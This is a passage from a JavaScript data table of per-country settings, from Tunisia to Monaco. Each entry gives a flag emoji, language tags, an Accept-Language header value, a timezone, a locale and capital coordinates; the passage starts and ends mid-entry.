    name: 'Tunisia',
    flag: '\uD83C\uDDF9\uD83C\uDDF3',
    languages: ['ar-TN', 'ar', 'fr-FR', 'fr'],
    acceptLang: 'ar-TN,ar;q=0.9,fr-FR;q=0.8,fr;q=0.7',
    timezone: 'Africa/Tunis',
    locale: 'ar_TN',
    lat: 36.8065,
    lon: 10.1815
  },
  UG: {
    name: 'Uganda',
    flag: '\uD83C\uDDFA\uD83C\uDDEC',
    languages: ['en-UG', 'en', 'sw-UG', 'sw'],
    acceptLang: 'en-UG,en;q=0.9,sw-UG;q=0.8',
    timezone: 'Africa/Kampala',
    locale: 'en_UG',
    lat: 0.3476,
    lon: 32.5825
  },
  TZ: {
    name: 'Tanzania',
    flag: '\uD83C\uDDF9\uD83C\uDDFF',
    languages: ['sw-TZ', 'sw', 'en-TZ', 'en'],
    acceptLang: 'sw-TZ,sw;q=0.9,en-TZ;q=0.8,en;q=0.7',
    timezone: 'Africa/Dar_es_Salaam',
    locale: 'sw_TZ',
    lat: -6.7924,
    lon: 39.2083
  },
  SN: {
    name: 'Senegal',
    flag: '\uD83C\uDDF8\uD83C\uDDF3',
    languages: ['fr-SN', 'fr', 'en-US', 'en'],
    acceptLang: 'fr-SN,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Africa/Dakar',
    locale: 'fr_SN',
    lat: 14.6928,
    lon: -17.4467
  },
  CI: {
    name: 'Ivory Coast',
    flag: '\uD83C\uDDE8\uD83C\uDDEE',
    languages: ['fr-CI', 'fr', 'en-US', 'en'],
    acceptLang: 'fr-CI,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Africa/Abidjan',
    locale: 'fr_CI',
    lat: 5.36,
    lon: -4.0083
  },
  CM: {
    name: 'Cameroon',
    flag: '\uD83C\uDDE8\uD83C\uDDF2',
    languages: ['fr-CM', 'fr', 'en-CM', 'en'],
    acceptLang: 'fr-CM,fr;q=0.9,en-CM;q=0.8,en;q=0.7',
    timezone: 'Africa/Douala',
    locale: 'fr_CM',
    lat: 4.0511,
    lon: 9.7679
  },
  AO: {
    name: 'Angola',
    flag: '\uD83C\uDDE6\uD83C\uDDF4',
    languages: ['pt-AO', 'pt', 'en-US', 'en'],
    acceptLang: 'pt-AO,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'Africa/Luanda',
    locale: 'pt_AO',
    lat: -8.839,
    lon: 13.2894
  },
  US: {
    name: 'United States',
    flag: '\uD83C\uDDFA\uD83C\uDDF8',
    languages: ['en-US', 'en'],
    acceptLang: 'en-US,en;q=0.9',
    timezone: 'America/New_York',
    locale: 'en_US',
    lat: 40.7128,
    lon: -74.006
  },
  CA: {
    name: 'Canada',
    flag: '\uD83C\uDDE8\uD83C\uDDE6',
    languages: ['en-CA', 'en', 'fr-CA', 'fr'],
    acceptLang: 'en-CA,en;q=0.9,fr-CA;q=0.8,fr;q=0.7',
    timezone: 'America/Toronto',
    locale: 'en_CA',
    lat: 43.6532,
    lon: -79.3832
  },
  MX: {
    name: 'Mexico',
    flag: '\uD83C\uDDF2\uD83C\uDDFD',
    languages: ['es-MX', 'es', 'en-US', 'en'],
    acceptLang: 'es-MX,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Mexico_City',
    locale: 'es_MX',
    lat: 19.4326,
    lon: -99.1332
  },
  BR: {
    name: 'Brazil',
    flag: '\uD83C\uDDE7\uD83C\uDDF7',
    languages: ['pt-BR', 'pt', 'en-US', 'en'],
    acceptLang: 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Sao_Paulo',
    locale: 'pt_BR',
    lat: -23.5505,
    lon: -46.6333
  },
  AR: {
    name: 'Argentina',
    flag: '\uD83C\uDDE6\uD83C\uDDF7',
    languages: ['es-AR', 'es', 'en-US', 'en'],
    acceptLang: 'es-AR,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Argentina/Buenos_Aires',
    locale: 'es_AR',
    lat: -34.6037,
    lon: -58.3816
  },
  CL: {
    name: 'Chile',
    flag: '\uD83C\uDDE8\uD83C\uDDF1',
    languages: ['es-CL', 'es', 'en-US', 'en'],
    acceptLang: 'es-CL,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Santiago',
    locale: 'es_CL',
    lat: -33.4489,
    lon: -70.6693
  },
  CO: {
    name: 'Colombia',
    flag: '\uD83C\uDDE8\uD83C\uDDF4',
    languages: ['es-CO', 'es', 'en-US', 'en'],
    acceptLang: 'es-CO,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Bogota',
    locale: 'es_CO',
    lat: 4.711,
    lon: -74.0721
  },
  PE: {
    name: 'Peru',
    flag: '\uD83C\uDDF5\uD83C\uDDEA',
    languages: ['es-PE', 'es', 'en-US', 'en'],
    acceptLang: 'es-PE,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Lima',
    locale: 'es_PE',
    lat: -12.0464,
    lon: -77.0428
  },
  VE: {
    name: 'Venezuela',
    flag: '\uD83C\uDDFB\uD83C\uDDEA',
    languages: ['es-VE', 'es', 'en-US', 'en'],
    acceptLang: 'es-VE,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Caracas',
    locale: 'es_VE',
    lat: 10.4806,
    lon: -66.9036
  },
  EC: {
    name: 'Ecuador',
    flag: '\uD83C\uDDEA\uD83C\uDDE8',
    languages: ['es-EC', 'es', 'en-US', 'en'],
    acceptLang: 'es-EC,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Guayaquil',
    locale: 'es_EC',
    lat: -0.1807,
    lon: -78.4678
  },
  BO: {
    name: 'Bolivia',
    flag: '\uD83C\uDDE7\uD83C\uDDF4',
    languages: ['es-BO', 'es', 'en-US', 'en'],
    acceptLang: 'es-BO,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/La_Paz',
    locale: 'es_BO',
    lat: -16.4897,
    lon: -68.1193
  },
  PY: {
    name: 'Paraguay',
    flag: '\uD83C\uDDF5\uD83C\uDDFE',
    languages: ['es-PY', 'es', 'en-US', 'en'],
    acceptLang: 'es-PY,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Asuncion',
    locale: 'es_PY',
    lat: -25.2637,
    lon: -57.5759
  },
  UY: {
    name: 'Uruguay',
    flag: '\uD83C\uDDFA\uD83C\uDDFE',
    languages: ['es-UY', 'es', 'en-US', 'en'],
    acceptLang: 'es-UY,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Montevideo',
    locale: 'es_UY',
    lat: -34.9011,
    lon: -56.1645
  },
  GT: {
    name: 'Guatemala',
    flag: '\uD83C\uDDEC\uD83C\uDDF9',
    languages: ['es-GT', 'es', 'en-US', 'en'],
    acceptLang: 'es-GT,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Guatemala',
    locale: 'es_GT',
    lat: 14.6349,
    lon: -90.5069
  },
  CR: {
    name: 'Costa Rica',
    flag: '\uD83C\uDDE8\uD83C\uDDF7',
    languages: ['es-CR', 'es', 'en-US', 'en'],
    acceptLang: 'es-CR,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Costa_Rica',
    locale: 'es_CR',
    lat: 9.9281,
    lon: -84.0907
  },
  PA: {
    name: 'Panama',
    flag: '\uD83C\uDDF5\uD83C\uDDE6',
    languages: ['es-PA', 'es', 'en-US', 'en'],
    acceptLang: 'es-PA,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Panama',
    locale: 'es_PA',
    lat: 8.9824,
    lon: -79.5199
  },
  DO: {
    name: 'Dominican Rep.',
    flag: '\uD83C\uDDE9\uD83C\uDDF4',
    languages: ['es-DO', 'es', 'en-US', 'en'],
    acceptLang: 'es-DO,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Santo_Domingo',
    locale: 'es_DO',
    lat: 18.4861,
    lon: -69.9312
  },
  CU: {
    name: 'Cuba',
    flag: '\uD83C\uDDE8\uD83C\uDDFA',
    languages: ['es-CU', 'es', 'en-US', 'en'],
    acceptLang: 'es-CU,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Havana',
    locale: 'es_CU',
    lat: 23.1136,
    lon: -82.3666
  },
  JM: {
    name: 'Jamaica',
    flag: '\uD83C\uDDEF\uD83C\uDDF2',
    languages: ['en-JM', 'en'],
    acceptLang: 'en-JM,en;q=0.9',
    timezone: 'America/Jamaica',
    locale: 'en_JM',
    lat: 17.9712,
    lon: -76.7928
  },
  HN: {
    name: 'Honduras',
    flag: '\uD83C\uDDED\uD83C\uDDF3',
    languages: ['es-HN', 'es', 'en-US', 'en'],
    acceptLang: 'es-HN,es;q=0.9,en-US;q=0.8,en;q=0.7',
    timezone: 'America/Tegucigalpa',
    locale: 'es_HN',
    lat: 14.0723,
    lon: -87.1921
  },
  AU: {
    name: 'Australia',
    flag: '\uD83C\uDDE6\uD83C\uDDFA',
    languages: ['en-AU', 'en'],
    acceptLang: 'en-AU,en;q=0.9',
    timezone: 'Australia/Sydney',
    locale: 'en_AU',
    lat: -33.8688,
    lon: 151.2093
  },
  NZ: {
    name: 'New Zealand',
    flag: '\uD83C\uDDF3\uD83C\uDDFF',
    languages: ['en-NZ', 'en'],
    acceptLang: 'en-NZ,en;q=0.9',
    timezone: 'Pacific/Auckland',
    locale: 'en_NZ',
    lat: -36.8485,
    lon: 174.7633
  },
  FJ: {
    name: 'Fiji',
    flag: '\uD83C\uDDEB\uD83C\uDDEF',
    languages: ['en-FJ', 'en'],
    acceptLang: 'en-FJ,en;q=0.9',
    timezone: 'Pacific/Fiji',
    locale: 'en_FJ',
    lat: -18.1416,
    lon: 178.4419
  },
  PG: {
    name: 'Papua New Guinea',
    flag: '\uD83C\uDDF5\uD83C\uDDEC',
    languages: ['en-PG', 'en'],
    acceptLang: 'en-PG,en;q=0.9',
    timezone: 'Pacific/Port_Moresby',
    locale: 'en_PG',
    lat: -9.4438,
    lon: 147.1803
  },
  AD: {
    name: 'Andorra',
    flag: '\uD83C\uDDE6\uD83C\uDDE9',
    languages: ['ca-AD', 'ca', 'es-AD'],
    acceptLang: 'ca-AD,ca;q=0.9,es-AD;q=0.8',
    timezone: 'Europe/Andorra',
    locale: 'ca_AD',
    lat: 42.5063,
    lon: 1.5218
  },
  AG: {
    name: 'Antigua & Barbuda',
    flag: '\uD83C\uDDE6\uD83C\uDDEC',
    languages: ['en-AG', 'en'],
    acceptLang: 'en-AG,en;q=0.9',
    timezone: 'America/Antigua',
    locale: 'en_AG',
    lat: 17.1274,
    lon: -61.8468
  },
  AI: {
    name: 'Anguilla',
    flag: '\uD83C\uDDE6\uD83C\uDDEE',
    languages: ['en-AI', 'en'],
    acceptLang: 'en-AI,en;q=0.9',
    timezone: 'America/Anguilla',
    locale: 'en_AI',
    lat: 18.2206,
    lon: -63.0688
  },
  AM: {
    name: 'Armenia',
    flag: '\uD83C\uDDE6\uD83C\uDDF2',
    languages: ['hy-AM', 'hy', 'ru-AM'],
    acceptLang: 'hy-AM,hy;q=0.9,ru-AM;q=0.8',
    timezone: 'Asia/Yerevan',
    locale: 'hy_AM',
    lat: 40.1792,
    lon: 44.4991
  },
  AW: {
    name: 'Aruba',
    flag: '\uD83C\uDDE6\uD83C\uDDFC',
    languages: ['nl-AW', 'nl', 'pap-AW'],
    acceptLang: 'nl-AW,nl;q=0.9,pap-AW;q=0.8',
    timezone: 'America/Aruba',
    locale: 'nl_AW',
    lat: 12.5211,
    lon: -70.029
  },
  AX: {
    name: 'Åland Islands',
    flag: '\uD83C\uDDE6\uD83C\uDDFD',
    languages: ['sv-AX', 'sv', 'fi-AX'],
    acceptLang: 'sv-AX,sv;q=0.9,fi-AX;q=0.8',
    timezone: 'Europe/Mariehamn',
    locale: 'sv_AX',
    lat: 60.0973,
    lon: 19.9348
  },
  AZ: {
    name: 'Azerbaijan',
    flag: '\uD83C\uDDE6\uD83C\uDDFF',
    languages: ['az-AZ', 'az', 'ru-AZ'],
    acceptLang: 'az-AZ,az;q=0.9,ru-AZ;q=0.8',
    timezone: 'Asia/Baku',
    locale: 'az_AZ',
    lat: 40.4093,
    lon: 49.8671
  },
  BB: {
    name: 'Barbados',
    flag: '\uD83C\uDDE7\uD83C\uDDE7',
    languages: ['en-BB', 'en'],
    acceptLang: 'en-BB,en;q=0.9',
    timezone: 'America/Barbados',
    locale: 'en_BB',
    lat: 13.1939,
    lon: -59.5432
  },
  BF: {
    name: 'Burkina Faso',
    flag: '\uD83C\uDDE7\uD83C\uDDEB',
    languages: ['fr-BF', 'fr'],
    acceptLang: 'fr-BF,fr;q=0.9',
    timezone: 'Africa/Ouagadougou',
    locale: 'fr_BF',
    lat: 12.3714,
    lon: -1.5197
  },
  BI: {
    name: 'Burundi',
    flag: '\uD83C\uDDE7\uD83C\uDDEE',
    languages: ['rn-BI', 'rn', 'fr-BI'],
    acceptLang: 'rn-BI,rn;q=0.9,fr-BI;q=0.8',
    timezone: 'Africa/Bujumbura',
    locale: 'rn_BI',
    lat: -3.3822,
    lon: 29.3644
  },
  BJ: {
    name: 'Benin',
    flag: '\uD83C\uDDE7\uD83C\uDDEF',
    languages: ['fr-BJ', 'fr'],
    acceptLang: 'fr-BJ,fr;q=0.9',
    timezone: 'Africa/Porto-Novo',
    locale: 'fr_BJ',
    lat: 6.4969,
    lon: 2.6283
  },
  BL: {
    name: 'Saint Barthélemy',
    flag: '\uD83C\uDDE7\uD83C\uDDF1',
    languages: ['fr-BL', 'fr'],
    acceptLang: 'fr-BL,fr;q=0.9',
    timezone: 'America/St_Barthelemy',
    locale: 'fr_BL',
    lat: 17.9,
    lon: -62.8333
  },
  BM: {
    name: 'Bermuda',
    flag: '\uD83C\uDDE7\uD83C\uDDF2',
    languages: ['en-BM', 'en'],
    acceptLang: 'en-BM,en;q=0.9',
    timezone: 'Atlantic/Bermuda',
    locale: 'en_BM',
    lat: 32.2949,
    lon: -64.781
  },
  BN: {
    name: 'Brunei',
    flag: '\uD83C\uDDE7\uD83C\uDDF3',
    languages: ['ms-BN', 'ms', 'en-BN'],
    acceptLang: 'ms-BN,ms;q=0.9,en-BN;q=0.8',
    timezone: 'Asia/Brunei',
    locale: 'ms_BN',
    lat: 4.9031,
    lon: 114.9398
  },
  BQ: {
    name: 'Caribbean Netherlands',
    flag: '\uD83C\uDDE7\uD83C\uDDF6',
    languages: ['nl-BQ', 'nl'],
    acceptLang: 'nl-BQ,nl;q=0.9',
    timezone: 'America/Kralendijk',
    locale: 'nl_BQ',
    lat: 12.15,
    lon: -68.2667
  },
  BS: {
    name: 'Bahamas',
    flag: '\uD83C\uDDE7\uD83C\uDDF8',
    languages: ['en-BS', 'en'],
    acceptLang: 'en-BS,en;q=0.9',
    timezone: 'America/Nassau',
    locale: 'en_BS',
    lat: 25.0443,
    lon: -77.3504
  },
  BT: {
    name: 'Bhutan',
    flag: '\uD83C\uDDE7\uD83C\uDDF9',
    languages: ['dz-BT', 'dz'],
    acceptLang: 'dz-BT,dz;q=0.9',
    timezone: 'Asia/Thimphu',
    locale: 'dz_BT',
    lat: 27.4728,
    lon: 89.639
  },
  BV: {
    name: 'Bouvet Island',
    flag: '\uD83C\uDDE7\uD83C\uDDFB',
    languages: ['no-BV', 'no'],
    acceptLang: 'no-BV,no;q=0.9',
    timezone: 'Europe/Oslo',
    locale: 'no_BV',
    lat: -54.4208,
    lon: 3.3464
  },
  BW: {
    name: 'Botswana',
    flag: '\uD83C\uDDE7\uD83C\uDDFC',
    languages: ['en-BW', 'en', 'tn-BW'],
    acceptLang: 'en-BW,en;q=0.9,tn-BW;q=0.8',
    timezone: 'Africa/Gaborone',
    locale: 'en_BW',
    lat: -24.6282,
    lon: 25.9231
  },
  BZ: {
    name: 'Belize',
    flag: '\uD83C\uDDE7\uD83C\uDDFF',
    languages: ['en-BZ', 'en', 'es-BZ'],
    acceptLang: 'en-BZ,en;q=0.9,es-BZ;q=0.8',
    timezone: 'America/Belize',
    locale: 'en_BZ',
    lat: 17.251,
    lon: -88.759
  },
  CC: {
    name: 'Cocos Islands',
    flag: '\uD83C\uDDE8\uD83C\uDDE8',
    languages: ['en-CC', 'en'],
    acceptLang: 'en-CC,en;q=0.9',
    timezone: 'Indian/Cocos',
    locale: 'en_CC',
    lat: -12.1642,
    lon: 96.871
  },
  CD: {
    name: 'DR Congo',
    flag: '\uD83C\uDDE8\uD83C\uDDE9',
    languages: ['fr-CD', 'fr', 'ln-CD'],
    acceptLang: 'fr-CD,fr;q=0.9,ln-CD;q=0.8',
    timezone: 'Africa/Kinshasa',
    locale: 'fr_CD',
    lat: -4.4419,
    lon: 15.2663
  },
  CF: {
    name: 'Central African Rep.',
    flag: '\uD83C\uDDE8\uD83C\uDDEB',
    languages: ['fr-CF', 'fr', 'sg-CF'],
    acceptLang: 'fr-CF,fr;q=0.9,sg-CF;q=0.8',
    timezone: 'Africa/Bangui',
    locale: 'fr_CF',
    lat: 4.3947,
    lon: 18.5582
  },
  CG: {
    name: 'Congo',
    flag: '\uD83C\uDDE8\uD83C\uDDEC',
    languages: ['fr-CG', 'fr'],
    acceptLang: 'fr-CG,fr;q=0.9',
    timezone: 'Africa/Brazzaville',
    locale: 'fr_CG',
    lat: -4.2634,
    lon: 15.2429
  },
  CK: {
    name: 'Cook Islands',
    flag: '\uD83C\uDDE8\uD83C\uDDF0',
    languages: ['en-CK', 'en'],
    acceptLang: 'en-CK,en;q=0.9',
    timezone: 'Pacific/Rarotonga',
    locale: 'en_CK',
    lat: -21.2367,
    lon: -159.7777
  },
  CV: {
    name: 'Cape Verde',
    flag: '\uD83C\uDDE8\uD83C\uDDFB',
    languages: ['pt-CV', 'pt'],
    acceptLang: 'pt-CV,pt;q=0.9',
    timezone: 'Atlantic/Cape_Verde',
    locale: 'pt_CV',
    lat: 14.9331,
    lon: -23.5133
  },
  CW: {
    name: 'Curaçao',
    flag: '\uD83C\uDDE8\uD83C\uDDFC',
    languages: ['nl-CW', 'nl', 'pap-CW'],
    acceptLang: 'nl-CW,nl;q=0.9,pap-CW;q=0.8',
    timezone: 'America/Curacao',
    locale: 'nl_CW',
    lat: 12.1224,
    lon: -68.8824
  },
  CX: {
    name: 'Christmas Island',
    flag: '\uD83C\uDDE8\uD83C\uDDFD',
    languages: ['en-CX', 'en'],
    acceptLang: 'en-CX,en;q=0.9',
    timezone: 'Indian/Christmas',
    locale: 'en_CX',
    lat: -10.4475,
    lon: 105.6904
  },
  DJ: {
    name: 'Djibouti',
    flag: '\uD83C\uDDE9\uD83C\uDDEF',
    languages: ['fr-DJ', 'fr', 'ar-DJ'],
    acceptLang: 'fr-DJ,fr;q=0.9,ar-DJ;q=0.8',
    timezone: 'Africa/Djibouti',
    locale: 'fr_DJ',
    lat: 11.5721,
    lon: 43.1456
  },
  DM: {
    name: 'Dominica',
    flag: '\uD83C\uDDE9\uD83C\uDDF2',
    languages: ['en-DM', 'en'],
    acceptLang: 'en-DM,en;q=0.9',
    timezone: 'America/Dominica',
    locale: 'en_DM',
    lat: 15.3092,
    lon: -61.3794
  },
  EH: {
    name: 'Western Sahara',
    flag: '\uD83C\uDDEA\uD83C\uDDED',
    languages: ['ar-EH', 'ar'],
    acceptLang: 'ar-EH,ar;q=0.9',
    timezone: 'Africa/El_Aaiun',
    locale: 'ar_EH',
    lat: 27.1536,
    lon: -13.2033
  },
  ER: {
    name: 'Eritrea',
    flag: '\uD83C\uDDEA\uD83C\uDDF7',
    languages: ['ti-ER', 'ti', 'ar-ER'],
    acceptLang: 'ti-ER,ti;q=0.9,ar-ER;q=0.8',
    timezone: 'Africa/Asmara',
    locale: 'ti_ER',
    lat: 15.3229,
    lon: 38.9251
  },
  FK: {
    name: 'Falkland Islands',
    flag: '\uD83C\uDDEB\uD83C\uDDF0',
    languages: ['en-FK', 'en'],
    acceptLang: 'en-FK,en;q=0.9',
    timezone: 'Atlantic/Stanley',
    locale: 'en_FK',
    lat: -51.7963,
    lon: -59.5236
  },
  FM: {
    name: 'Micronesia',
    flag: '\uD83C\uDDEB\uD83C\uDDF2',
    languages: ['en-FM', 'en'],
    acceptLang: 'en-FM,en;q=0.9',
    timezone: 'Pacific/Chuuk',
    locale: 'en_FM',
    lat: 6.9248,
    lon: 158.161
  },
  FO: {
    name: 'Faroe Islands',
    flag: '\uD83C\uDDEB\uD83C\uDDF4',
    languages: ['fo-FO', 'fo', 'da-FO'],
    acceptLang: 'fo-FO,fo;q=0.9,da-FO;q=0.8',
    timezone: 'Atlantic/Faroe',
    locale: 'fo_FO',
    lat: 62.0079,
    lon: -6.7909
  },
  GA: {
    name: 'Gabon',
    flag: '\uD83C\uDDEC\uD83C\uDDE6',
    languages: ['fr-GA', 'fr'],
    acceptLang: 'fr-GA,fr;q=0.9',
    timezone: 'Africa/Libreville',
    locale: 'fr_GA',
    lat: 0.4162,
    lon: 9.4673
  },
  GD: {
    name: 'Grenada',
    flag: '\uD83C\uDDEC\uD83C\uDDE9',
    languages: ['en-GD', 'en'],
    acceptLang: 'en-GD,en;q=0.9',
    timezone: 'America/Grenada',
    locale: 'en_GD',
    lat: 12.0564,
    lon: -61.7485
  },
  GE: {
    name: 'Georgia',
    flag: '\uD83C\uDDEC\uD83C\uDDEA',
    languages: ['ka-GE', 'ka'],
    acceptLang: 'ka-GE,ka;q=0.9',
    timezone: 'Asia/Tbilisi',
    locale: 'ka_GE',
    lat: 41.7151,
    lon: 44.8271
  },
  GF: {
    name: 'French Guiana',
    flag: '\uD83C\uDDEC\uD83C\uDDEB',
    languages: ['fr-GF', 'fr'],
    acceptLang: 'fr-GF,fr;q=0.9',
    timezone: 'America/Cayenne',
    locale: 'fr_GF',
    lat: 4.9224,
    lon: -52.3135
  },
  GG: {
    name: 'Guernsey',
    flag: '\uD83C\uDDEC\uD83C\uDDEC',
    languages: ['en-GG', 'en'],
    acceptLang: 'en-GG,en;q=0.9',
    timezone: 'Europe/Guernsey',
    locale: 'en_GG',
    lat: 49.4657,
    lon: -2.5853
  },
  GI: {
    name: 'Gibraltar',
    flag: '\uD83C\uDDEC\uD83C\uDDEE',
    languages: ['en-GI', 'en', 'es-GI'],
    acceptLang: 'en-GI,en;q=0.9,es-GI;q=0.8',
    timezone: 'Europe/Gibraltar',
    locale: 'en_GI',
    lat: 36.1408,
    lon: -5.3536
  },
  GL: {
    name: 'Greenland',
    flag: '\uD83C\uDDEC\uD83C\uDDF1',
    languages: ['kl-GL', 'kl', 'da-GL'],
    acceptLang: 'kl-GL,kl;q=0.9,da-GL;q=0.8',
    timezone: 'America/Nuuk',
    locale: 'kl_GL',
    lat: 64.1814,
    lon: -51.6941
  },
  GM: {
    name: 'Gambia',
    flag: '\uD83C\uDDEC\uD83C\uDDF2',
    languages: ['en-GM', 'en'],
    acceptLang: 'en-GM,en;q=0.9',
    timezone: 'Africa/Banjul',
    locale: 'en_GM',
    lat: 13.4549,
    lon: -16.579
  },
  GN: {
    name: 'Guinea',
    flag: '\uD83C\uDDEC\uD83C\uDDF3',
    languages: ['fr-GN', 'fr'],
    acceptLang: 'fr-GN,fr;q=0.9',
    timezone: 'Africa/Conakry',
    locale: 'fr_GN',
    lat: 9.6412,
    lon: -13.5784
  },
  GP: {
    name: 'Guadeloupe',
    flag: '\uD83C\uDDEC\uD83C\uDDF5',
    languages: ['fr-GP', 'fr'],
    acceptLang: 'fr-GP,fr;q=0.9',
    timezone: 'America/Guadeloupe',
    locale: 'fr_GP',
    lat: 16.265,
    lon: -61.551
  },
  GQ: {
    name: 'Equatorial Guinea',
    flag: '\uD83C\uDDEC\uD83C\uDDF6',
    languages: ['es-GQ', 'es', 'fr-GQ'],
    acceptLang: 'es-GQ,es;q=0.9,fr-GQ;q=0.8',
    timezone: 'Africa/Malabo',
    locale: 'es_GQ',
    lat: 3.7504,
    lon: 8.7371
  },
  GS: {
    name: 'South Georgia',
    flag: '\uD83C\uDDEC\uD83C\uDDF8',
    languages: ['en-GS', 'en'],
    acceptLang: 'en-GS,en;q=0.9',
    timezone: 'Atlantic/South_Georgia',
    locale: 'en_GS',
    lat: -54.4296,
    lon: -36.5879
  },
  GU: {
    name: 'Guam',
    flag: '\uD83C\uDDEC\uD83C\uDDFA',
    languages: ['en-GU', 'en', 'ch-GU'],
    acceptLang: 'en-GU,en;q=0.9,ch-GU;q=0.8',
    timezone: 'Pacific/Guam',
    locale: 'en_GU',
    lat: 13.4443,
    lon: 144.7937
  },
  GW: {
    name: 'Guinea-Bissau',
    flag: '\uD83C\uDDEC\uD83C\uDDFC',
    languages: ['pt-GW', 'pt'],
    acceptLang: 'pt-GW,pt;q=0.9',
    timezone: 'Africa/Bissau',
    locale: 'pt_GW',
    lat: 11.8636,
    lon: -15.5977
  },
  GY: {
    name: 'Guyana',
    flag: '\uD83C\uDDEC\uD83C\uDDFE',
    languages: ['en-GY', 'en'],
    acceptLang: 'en-GY,en;q=0.9',
    timezone: 'America/Guyana',
    locale: 'en_GY',
    lat: 6.8013,
    lon: -58.1551
  },
  HT: {
    name: 'Haiti',
    flag: '\uD83C\uDDED\uD83C\uDDF9',
    languages: ['ht-HT', 'ht', 'fr-HT'],
    acceptLang: 'ht-HT,ht;q=0.9,fr-HT;q=0.8',
    timezone: 'America/Port-au-Prince',
    locale: 'ht_HT',
    lat: 18.5944,
    lon: -72.3074
  },
  IM: {
    name: 'Isle of Man',
    flag: '\uD83C\uDDEE\uD83C\uDDF2',
    languages: ['en-IM', 'en', 'gv-IM'],
    acceptLang: 'en-IM,en;q=0.9,gv-IM;q=0.8',
    timezone: 'Europe/Isle_of_Man',
    locale: 'en_IM',
    lat: 54.2361,
    lon: -4.5481
  },
  IO: {
    name: 'British Indian Ocean',
    flag: '\uD83C\uDDEE\uD83C\uDDF4',
    languages: ['en-IO', 'en'],
    acceptLang: 'en-IO,en;q=0.9',
    timezone: 'Indian/Chagos',
    locale: 'en_IO',
    lat: -7.3344,
    lon: 72.4244
  },
  JE: {
    name: 'Jersey',
    flag: '\uD83C\uDDEF\uD83C\uDDEA',
    languages: ['en-JE', 'en'],
    acceptLang: 'en-JE,en;q=0.9',
    timezone: 'Europe/Jersey',
    locale: 'en_JE',
    lat: 49.2144,
    lon: -2.1312
  },
  KG: {
    name: 'Kyrgyzstan',
    flag: '\uD83C\uDDF0\uD83C\uDDEC',
    languages: ['ky-KG', 'ky', 'ru-KG'],
    acceptLang: 'ky-KG,ky;q=0.9,ru-KG;q=0.8',
    timezone: 'Asia/Bishkek',
    locale: 'ky_KG',
    lat: 42.8746,
    lon: 74.5698
  },
  KI: {
    name: 'Kiribati',
    flag: '\uD83C\uDDF0\uD83C\uDDEE',
    languages: ['en-KI', 'en'],
    acceptLang: 'en-KI,en;q=0.9',
    timezone: 'Pacific/Tarawa',
    locale: 'en_KI',
    lat: 1.4518,
    lon: 172.9717
  },
  KM: {
    name: 'Comoros',
    flag: '\uD83C\uDDF0\uD83C\uDDF2',
    languages: ['ar-KM', 'ar', 'fr-KM'],
    acceptLang: 'ar-KM,ar;q=0.9,fr-KM;q=0.8',
    timezone: 'Indian/Comoro',
    locale: 'ar_KM',
    lat: -11.7172,
    lon: 43.2473
  },
  KN: {
    name: 'Saint Kitts & Nevis',
    flag: '\uD83C\uDDF0\uD83C\uDDF3',
    languages: ['en-KN', 'en'],
    acceptLang: 'en-KN,en;q=0.9',
    timezone: 'America/St_Kitts',
    locale: 'en_KN',
    lat: 17.3026,
    lon: -62.7177
  },
  KP: {
    name: 'North Korea',
    flag: '\uD83C\uDDF0\uD83C\uDDF5',
    languages: ['ko-KP', 'ko'],
    acceptLang: 'ko-KP,ko;q=0.9',
    timezone: 'Asia/Pyongyang',
    locale: 'ko_KP',
    lat: 39.0392,
    lon: 125.7625
  },
  KY: {
    name: 'Cayman Islands',
    flag: '\uD83C\uDDF0\uD83C\uDDFE',
    languages: ['en-KY', 'en'],
    acceptLang: 'en-KY,en;q=0.9',
    timezone: 'America/Cayman',
    locale: 'en_KY',
    lat: 19.3133,
    lon: -81.2546
  },
  LC: {
    name: 'Saint Lucia',
    flag: '\uD83C\uDDF1\uD83C\uDDE8',
    languages: ['en-LC', 'en'],
    acceptLang: 'en-LC,en;q=0.9',
    timezone: 'America/St_Lucia',
    locale: 'en_LC',
    lat: 14.0101,
    lon: -60.9875
  },
  LI: {
    name: 'Liechtenstein',
    flag: '\uD83C\uDDF1\uD83C\uDDEE',
    languages: ['de-LI', 'de'],
    acceptLang: 'de-LI,de;q=0.9',
    timezone: 'Europe/Vaduz',
    locale: 'de_LI',
    lat: 47.141,
    lon: 9.5209
  },
  LR: {
    name: 'Liberia',
    flag: '\uD83C\uDDF1\uD83C\uDDF7',
    languages: ['en-LR', 'en'],
    acceptLang: 'en-LR,en;q=0.9',
    timezone: 'Africa/Monrovia',
    locale: 'en_LR',
    lat: 6.2907,
    lon: -10.7605
  },
  LS: {
    name: 'Lesotho',
    flag: '\uD83C\uDDF1\uD83C\uDDF8',
    languages: ['st-LS', 'st', 'en-LS'],
    acceptLang: 'st-LS,st;q=0.9,en-LS;q=0.8',
    timezone: 'Africa/Maseru',
    locale: 'st_LS',
    lat: -29.3167,
    lon: 27.4833
  },
  LY: {
    name: 'Libya',
    flag: '\uD83C\uDDF1\uD83C\uDDFE',
    languages: ['ar-LY', 'ar'],
    acceptLang: 'ar-LY,ar;q=0.9',
    timezone: 'Africa/Tripoli',
    locale: 'ar_LY',
    lat: 32.8872,
    lon: 13.1913
  },
  MC: {
    name: 'Monaco',
    flag: '\uD83C\uDDF2\uD83C\uDDE8',
    languages: ['fr-MC', 'fr'],
    acceptLang: 'fr-MC,fr;q=0.9',
    timezone: 'Europe/Monaco',
